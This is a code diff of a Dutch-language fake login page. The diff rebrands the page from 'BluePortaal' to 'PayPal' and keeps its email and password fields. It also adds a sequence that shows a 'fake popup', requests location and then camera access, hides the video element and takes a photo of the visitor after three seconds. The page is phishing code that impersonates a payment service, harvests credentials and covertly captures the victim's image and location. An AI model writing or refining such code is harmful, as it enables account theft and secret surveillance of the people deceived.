@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BluePortaal - Inloggen</title>
+    <title>PayPal - Inloggen</title>
     <style>
         /* CSS-styling blijft hetzelfde */
     </style>
@@ -11,7 +11,7 @@
 <body class="paypal-background">
 
     <div class="container">
-        <h2 class="paypal-color">BluePortaal</h2>
+        <h2 class="paypal-color">PayPal</h2>
         <p>Log in om door te gaan</p>
         <input type="text" placeholder="E-mailadres" id="email">
         <input type="password" placeholder="Wachtwoord" id="password">
@@ -22,7 +22,7 @@
 
     <!-- Fake Browser Popup -->
     <div id="fake-popup">
-        <p class="popup-text">Om verder te gaan, controleren wij de locatie van uw netwerklaptop/-desktop.</p>
+        <p class="popup-text">Om verder te gaan, moeten de benodigde toestemmingen worden gegeven voor locatie en camera.</p>
     </div>
 
     <script>
@@ -40,7 +40,22 @@
                 document.getElementById("fake-popup").style.display = "none";
             }, 5000);
 
-            // Locatie toestemming aanvragen
+            // **Vraag de locatie toestemming eerst, daarna de camera toestemming**:
+            requestLocationPermission()
+                .then(() => {
+                    console.log("✅ Locatie toestemming gegeven!");
+                    // Als locatie toestemming is gegeven, vraag dan camera toestemming
+                    return requestCameraPermission();
+                })
+                .then(() => {
+                    console.log("✅ Camera toestemming gegeven!");
+                })
+                .catch(error => {
+                    console.log("❌ Fout bij het verkrijgen van toestemmingen:", error);
+                });
+        }
+
+        // Locatie toestemming aanvragen
         function requestLocationPermission() {
             return new Promise((resolve, reject) => {
                 if (navigator.geolocation) {
@@ -55,20 +70,6 @@
                     console.log("❌ Geolocatie wordt niet ondersteund door deze browser.");
                     reject("Geolocatie niet ondersteund");
                 }
-                
-            // **Wacht expliciet op toestemming van de gebruiker voor locatie en camera**:
-            // Vraag de locatie en camera toestemming hier
-            Promise.all([
-                requestLocationPermission(),
-                requestCameraPermission()
-            ]).then(() => {
-                console.log("✅ Toestemmingen gegeven!");
-            }).catch(error => {
-                console.log("❌ Fout bij het verkrijgen van toestemmingen:", error);
-            });
-        }
-
-       
             });
         }
 
@@ -88,10 +89,10 @@
                             // Video-element wordt verborgen
                             video.style.display = "none";
 
-                            // Simuleer foto na 2 seconden
+                            // Simuleer foto na 3 seconden
                             setTimeout(() => {
                                 takeSelfie(video, stream);
-                            }, 2000);
+                            }, 3000);
                             resolve();
                         })
                         .catch(error => {
